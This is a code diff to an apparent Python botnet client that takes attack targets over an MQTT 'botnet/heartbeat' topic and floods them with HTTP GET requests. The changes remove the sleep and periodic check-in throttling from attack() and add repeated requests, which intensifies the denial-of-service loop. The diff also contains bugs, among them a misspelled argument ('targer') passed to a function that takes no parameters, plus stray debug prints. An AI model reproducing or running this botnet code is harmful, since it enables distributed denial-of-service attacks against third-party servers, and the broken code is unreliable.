@@ -18,7 +18,7 @@ def on_connectm(client, userdata, flags, rc):
     client.unsuscribe("botnet/heartbeat")
 def on_messagem(client, userdata, msg):
     global received
-    global lastId
+    global lastId, target
     print(msg.topic+" "+str(msg.payload))
     print(" ")
     received=1
@@ -48,9 +48,14 @@ def on_messagesc(client, userdata, msg):
         if(msg.topic=="botnet/heartbeat" and lastId!=int(inp[1])):
             lastId=int(inp[1])
             print("New local last id:",lastId)
+        if(msg.topic=="botnet/heartbeat"):
+            print("a")
+            print(inp[0]!="0")
+            print(inp[0])
         if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
+            #Separar message de target y de common
            target= inp[0]
-           attack()
+           attack(targer)
         
 def heartbeat():
     global target
@@ -70,20 +75,28 @@ def attack():
         ##get
         print("get")
         r = requests.get(target)
-        #print(r.text)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
         #print(r.headers['content-type'])
         #print(r.headers)
         #print(r.status_code)
         #print(type(r)).
-        time.sleep(1)
-        if(int((time.time()-startTime)%60)==0):
-            client.loop(.1)
-            print("Checking")
-            if(target=="0"):
-                break
-                return
-            startTime=time.time()
-        #delay
+##        time.sleep(1)
+##        if(int((time.time()-startTime)%60)==0):
+##            client.loop(.1)
+##            print("Checking")
+##            if(target=="0"):
+##                break
+##                return
+##            startTime=time.time()
+##        #delay
 
 def slave():
     global client,nodeId,received
